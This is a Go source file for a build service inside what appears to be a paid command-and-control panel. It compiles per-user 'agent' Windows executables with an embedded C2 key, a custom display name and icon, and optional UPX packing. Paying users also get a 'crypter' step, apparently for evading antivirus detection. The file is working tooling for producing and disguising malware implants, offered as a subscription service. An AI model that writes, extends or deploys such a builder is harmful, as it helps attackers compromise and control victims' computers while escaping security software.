package builder

import (
	"bufio"
	"fmt"
	"io"
	"mime/multipart"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"

	"agentmanager/modules/crypto"
	"agentmanager/modules/wsutil"
)

type Status string

const (
	StatusIdle     Status = "idle"
	StatusBuilding Status = "building"
	StatusDone     Status = "done"
	StatusFailed   Status = "failed"
)

type Service struct {
	mu        sync.Mutex
	status    map[string]Status
	outPath   map[string]string
	agentDir  string
	buildsDir string
	iconsDir  string
	getKey    func(userID string) (string, error)
	panel     *wsutil.Hub
	plan      PlanChecker
}

type PlanChecker interface {
	IsPaid(userID string) bool
}

func NewService(agentDir, buildsDir, iconsDir string, getKey func(userID string) (string, error), panel *wsutil.Hub, plan PlanChecker) *Service {
	return &Service{
		status:    make(map[string]Status),
		outPath:   make(map[string]string),
		agentDir:  agentDir,
		buildsDir: buildsDir,
		iconsDir:  iconsDir,
		getKey:    getKey,
		panel:     panel,
		plan:      plan,
	}
}

func (s *Service) UserStatus(userID string) Status {
	s.mu.Lock()
	defer s.mu.Unlock()
	if st, ok := s.status[userID]; ok {
		return st
	}
	return StatusIdle
}

func (s *Service) DownloadReady(userID string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.status[userID] != StatusDone {
		return false
	}
	path := s.outPath[userID]
	if path == "" {
		return false
	}
	_, err := os.Stat(path)
	return err == nil
}

func (s *Service) emit(userID, line string) {
	s.panel.EmitToTag(userID, "build_output", map[string]string{"line": line})
}

func (s *Service) Start(debug, upx, crypter bool, displayName, iconPath, userID string) error {
	if crypter && s.plan != nil && !s.plan.IsPaid(userID) {
		return ErrPaidPlanRequired
	}
	s.mu.Lock()
	if s.status[userID] == StatusBuilding {
		s.mu.Unlock()
		return ErrBuildInProgress
	}
	s.status[userID] = StatusBuilding
	s.mu.Unlock()

	go s.run(debug, upx, crypter, displayName, iconPath, userID)
	return nil
}

func (s *Service) run(debug, upx, crypter bool, displayName, iconPath, userID string) {
	if upx {
		if _, err := exec.LookPath("upx"); err != nil {
			s.emit(userID, "warning: upx not found in PATH, building without compression")
			upx = false
		}
	}
	absBuildsDir, err := filepath.Abs(s.buildsDir)
	if err != nil {
		s.finish(userID, false, "failed to resolve builds dir: "+err.Error())
		return
	}
	userDir := filepath.Join(absBuildsDir, userID)
	os.RemoveAll(userDir)
	if err := os.MkdirAll(userDir, 0o755); err != nil {
		s.finish(userID, false, "failed to create build dir: "+err.Error())
		return
	}

	key, err := s.getKey(userID)
	if err != nil || key == "" {
		s.finish(userID, false, "failed to get agent key: "+err.Error())
		return
	}

	name := "agent-" + crypto.RandomHex(2) + ".exe"
	outPath := filepath.Join(userDir, name)

	boolStr := func(b bool) string {
		if b {
			return "t"
		}
		return "f"
	}
	stdin := fmt.Sprintf("%s\nf\n%s\n", boolStr(debug), boolStr(upx))

	s.emit(userID, "starting build...")
	cmd := exec.Command("go", "run", "./build/build.go")
	cmd.Dir = s.agentDir
	env := append(os.Environ(),
		"C2_KEY="+key,
		"BUILD_OUT="+outPath,
		"DISPLAY_NAME="+displayName,
	)
	if iconPath != "" {
		relIconPath := strings.TrimPrefix(iconPath, s.agentDir+string(filepath.Separator))
		env = append(env, "ICON_PATH="+relIconPath)
	}
	cmd.Env = env

	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		s.finish(userID, false, "failed to create stdin pipe: "+err.Error())
		return
	}

	pr, pw := io.Pipe()
	cmd.Stdout = pw
	cmd.Stderr = pw

	if err := cmd.Start(); err != nil {
		pw.Close()
		s.finish(userID, false, "failed to start build: "+err.Error())
		return
	}

	io.WriteString(stdinPipe, stdin)
	stdinPipe.Close()

	done := make(chan struct{})
	go func() {
		scanner := bufio.NewScanner(pr)
		for scanner.Scan() {
			s.emit(userID, scanner.Text())
		}
		close(done)
	}()

	err = cmd.Wait()
	pw.Close()
	pr.Close()
	<-done

	if err != nil {
		os.RemoveAll(userDir)
		s.finish(userID, false, "build failed: "+err.Error())
	} else {
		if crypter {
			s.emit(userID, "running crypter...")
			cryptedPath := outPath + ".crypted.exe"
			cmd := exec.Command("./bin/crypter", outPath, cryptedPath)
			cmd.Dir = filepath.Dir(s.agentDir)
			if out, err := cmd.CombinedOutput(); err != nil {
				s.emit(userID, "crypter failed: "+string(out))
				s.emit(userID, "returning uncrypted build")
			} else {
				os.Rename(cryptedPath, outPath)
				s.emit(userID, "crypter applied")
			}
		}
		s.mu.Lock()
		s.outPath[userID] = outPath
		s.mu.Unlock()
		s.finish(userID, true, "build complete")
	}
}

func (s *Service) finish(userID string, ok bool, msg string) {
	s.emit(userID, msg)
	s.mu.Lock()
	if ok {
		s.status[userID] = StatusDone
	} else {
		s.status[userID] = StatusFailed
	}
	filename := ""
	if ok {
		filename = filepath.Base(s.outPath[userID])
	}
	s.mu.Unlock()
	s.panel.EmitToTag(userID, "build_done", map[string]interface{}{
		"ok":       ok,
		"filename": filename,
	})
}

func (s *Service) BuildsDir() string {
	return s.buildsDir
}

func (s *Service) SaveIcon(formFile *multipart.FileHeader, userID string) (string, error) {
	iconDir := filepath.Join(s.iconsDir, userID)
	os.RemoveAll(iconDir)
	if err := os.MkdirAll(iconDir, 0o755); err != nil {
		return "", err
	}
	path := filepath.Join(iconDir, "icon.ico")
	src, err := formFile.Open()
	if err != nil {
		return "", err
	}
	defer src.Close()
	dst, err := os.Create(path)
	if err != nil {
		return "", err
	}
	defer dst.Close()
	if _, err := io.Copy(dst, src); err != nil {
		return "", err
	}
	return path, nil
}
